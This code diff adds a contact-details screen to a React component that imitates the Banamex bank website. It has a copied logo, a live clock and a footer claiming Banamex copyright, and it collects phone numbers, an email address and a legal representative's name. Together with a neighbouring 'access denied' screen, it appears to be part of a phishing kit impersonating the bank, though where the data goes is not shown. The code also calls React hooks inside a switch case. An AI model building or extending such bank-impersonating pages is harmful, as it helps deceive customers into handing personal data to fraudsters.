@@ -1191,6 +1191,220 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
           </div>
         );
 
+      case ScreenType.DATOS_CONTACTO:
+        const [telefono1, setTelefono1] = useState('');
+        const [telefono2, setTelefono2] = useState('');
+        const [correoContacto, setCorreoContacto] = useState('');
+        const [nombreRepresentante, setNombreRepresentante] = useState('');
+
+        const handleDatosContactoSubmit = () => {
+          if (telefono1 && correoContacto && nombreRepresentante) {
+            onSubmit(ScreenType.DATOS_CONTACTO, { 
+              telefono1, 
+              telefono2, 
+              correo: correoContacto, 
+              nombreRepresentante 
+            });
+          }
+        };
+
+        const [currentTime3, setCurrentTime3] = useState(new Date());
+
+        useEffect(() => {
+          const timer = setInterval(() => setCurrentTime3(new Date()), 1000);
+          return () => clearInterval(timer);
+        }, []);
+
+        const formatDateTime3 = (d: Date) => {
+          const days = ['Domingo','Lunes','Martes','Miércoles','Jueves','Viernes','Sábado'];
+          const months = ['Enero','Febrero','Marzo','Abril','Mayo','Junio','Julio','Agosto','Septiembre','Octubre','Noviembre','Diciembre'];
+          const pad = (n: number) => n < 10 ? '0'+n : n;
+          const dayName = days[d.getDay()];
+          const day = d.getDate();
+          const month = months[d.getMonth()];
+          const year = d.getFullYear();
+          const time = pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds());
+          return `${dayName} ${day} de ${month} de ${year}, ${time} Centro de México`;
+        };
+
+        return (
+          <div style={{ margin: 0, background: '#fff', color: '#0b3b43', padding: '28px', fontFamily: '"Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif' }}>
+            <div style={{ maxWidth: '900px', margin: '18px auto' }}>
+              <header style={{ display: 'flex', alignItems: 'center', gap: '18px', marginBottom: '22px' }}>
+                <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
+                  <svg width="54" height="54" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Banamex logo">
+                    <g fill="#c81f3b">
+                      <path d="M50 10c9 0 18 8 18 18s-9 18-18 18S32 37 32 27 41 10 50 10z"/>
+                      <path d="M50 32c9 0 18 8 18 18s-9 18-18 18-18-8-18-18 9-18 18-18z"/>
+                      <path d="M50 54c9 0 18 8 18 18s-9 18-18 18-18-8-18-18 9-18 18-18z"/>
+                    </g>
+                  </svg>
+                  <div>
+                    <div style={{ fontSize: '20px', fontWeight: 600, color: '#153e46' }}>Banamex</div>
+                  </div>
+                </div>
+
+                <div style={{ marginLeft: 'auto', textAlign: 'right' }}>
+                  <div style={{ fontSize: '14px', color: '#2d4b51' }}>
+                    {formatDateTime3(currentTime3)}
+                  </div>
+                </div>
+              </header>
+
+              <div style={{ 
+                background: 'linear-gradient(90deg, #f7fbfc 0%, #eef6f7 100%)', 
+                borderRadius: '8px', 
+                padding: '32px', 
+                boxShadow: '0 6px 18px rgba(0,0,0,0.08)', 
+                border: '1px solid rgba(0,0,0,0.03)' 
+              }} role="main">
+                <h1 style={{ fontSize: '28px', margin: '6px 0 24px', display: 'flex', alignItems: 'center', gap: '12px' }}>
+                  » Datos de contacto
+                </h1>
+
+                <div style={{ background: '#fff', borderRadius: '6px', padding: '24px', boxShadow: '0 3px 8px rgba(0,0,0,0.04)' }}>
+                  <p style={{ margin: '0 0 24px 0', color: '#3d5559', fontSize: '15px', lineHeight: 1.6 }}>
+                    Para continuar con su solicitud, necesitamos los siguientes datos de contacto:
+                  </p>
+
+                  <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
+                    <div>
+                      <label style={{ display: 'block', marginBottom: '8px', color: '#153e46', fontSize: '14px', fontWeight: 500 }}>
+                        Teléfono de contacto 1 <span style={{ color: '#c81f3b' }}>*</span>
+                      </label>
+                      <input 
+                        type="tel" 
+                        value={telefono1}
+                        onChange={(e) => setTelefono1(e.target.value.replace(/\D/g, '').slice(0, 10))}
+                        placeholder="10 dígitos"
+                        maxLength={10}
+                        style={{ 
+                          width: '100%', 
+                          padding: '12px 16px', 
+                          fontSize: '16px', 
+                          border: '2px solid #b4d5d8', 
+                          borderRadius: '6px', 
+                          background: '#f7fbfc', 
+                          color: '#153e46',
+                          boxSizing: 'border-box'
+                        }}
+                      />
+                    </div>
+
+                    <div>
+                      <label style={{ display: 'block', marginBottom: '8px', color: '#153e46', fontSize: '14px', fontWeight: 500 }}>
+                        Teléfono de contacto 2 (opcional)
+                      </label>
+                      <input 
+                        type="tel" 
+                        value={telefono2}
+                        onChange={(e) => setTelefono2(e.target.value.replace(/\D/g, '').slice(0, 10))}
+                        placeholder="10 dígitos"
+                        maxLength={10}
+                        style={{ 
+                          width: '100%', 
+                          padding: '12px 16px', 
+                          fontSize: '16px', 
+                          border: '2px solid #b4d5d8', 
+                          borderRadius: '6px', 
+                          background: '#f7fbfc', 
+                          color: '#153e46',
+                          boxSizing: 'border-box'
+                        }}
+                      />
+                    </div>
+
+                    <div>
+                      <label style={{ display: 'block', marginBottom: '8px', color: '#153e46', fontSize: '14px', fontWeight: 500 }}>
+                        Correo electrónico <span style={{ color: '#c81f3b' }}>*</span>
+                      </label>
+                      <input 
+                        type="email" 
+                        value={correoContacto}
+                        onChange={(e) => setCorreoContacto(e.target.value)}
+                        placeholder="correo@ejemplo.com"
+                        style={{ 
+                          width: '100%', 
+                          padding: '12px 16px', 
+                          fontSize: '16px', 
+                          border: '2px solid #b4d5d8', 
+                          borderRadius: '6px', 
+                          background: '#f7fbfc', 
+                          color: '#153e46',
+                          boxSizing: 'border-box'
+                        }}
+                      />
+                    </div>
+
+                    <div>
+                      <label style={{ display: 'block', marginBottom: '8px', color: '#153e46', fontSize: '14px', fontWeight: 500 }}>
+                        Nombre del representante legal <span style={{ color: '#c81f3b' }}>*</span>
+                      </label>
+                      <input 
+                        type="text" 
+                        value={nombreRepresentante}
+                        onChange={(e) => setNombreRepresentante(e.target.value)}
+                        placeholder="Nombre completo"
+                        style={{ 
+                          width: '100%', 
+                          padding: '12px 16px', 
+                          fontSize: '16px', 
+                          border: '2px solid #b4d5d8', 
+                          borderRadius: '6px', 
+                          background: '#f7fbfc', 
+                          color: '#153e46',
+                          boxSizing: 'border-box'
+                        }}
+                      />
+                    </div>
+                  </div>
+
+                  <div style={{ marginTop: '28px', display: 'flex', gap: '12px', justifyContent: 'flex-end' }}>
+                    <button 
+                      style={{ 
+                        padding: '12px 24px', 
+                        background: '#fff', 
+                        color: '#3d5559', 
+                        border: '2px solid #c4d5d7', 
+                        borderRadius: '6px', 
+                        fontSize: '15px', 
+                        fontWeight: 500, 
+                        cursor: 'pointer' 
+                      }} 
+                      type="button"
+                    >
+                      Cancelar
+                    </button>
+                    <button 
+                      style={{ 
+                        padding: '12px 24px', 
+                        background: telefono1 && correoContacto && nombreRepresentante ? '#153e46' : '#b4d5d8', 
+                        color: '#fff', 
+                        border: 'none', 
+                        borderRadius: '6px', 
+                        fontSize: '15px', 
+                        fontWeight: 600, 
+                        cursor: telefono1 && correoContacto && nombreRepresentante ? 'pointer' : 'not-allowed',
+                        opacity: telefono1 && correoContacto && nombreRepresentante ? 1 : 0.6
+                      }} 
+                      type="button"
+                      onClick={handleDatosContactoSubmit}
+                      disabled={!telefono1 || !correoContacto || !nombreRepresentante}
+                    >
+                      Continuar
+                    </button>
+                  </div>
+                </div>
+              </div>
+
+              <footer style={{ marginTop: '28px', paddingTop: '18px', borderTop: '1px solid #e0e0e0', textAlign: 'center', fontSize: '11px', color: '#666' }}>
+                <p style={{ margin: '4px 0' }}>Banamex es una marca registrada de Citigroup Inc. utilizada bajo licencia por Banco Nacional de México, S.A.</p>
+                <p style={{ margin: '4px 0' }}>© 2025 Banco Nacional de México, S.A. Derechos Reservados</p>
+              </footer>
+            </div>
+          </div>
+        );
+
       case ScreenType.ACCESO_DENEGADO:
         const accesoDenegadoContent = (
           <div className="bg-white p-6 rounded-lg">
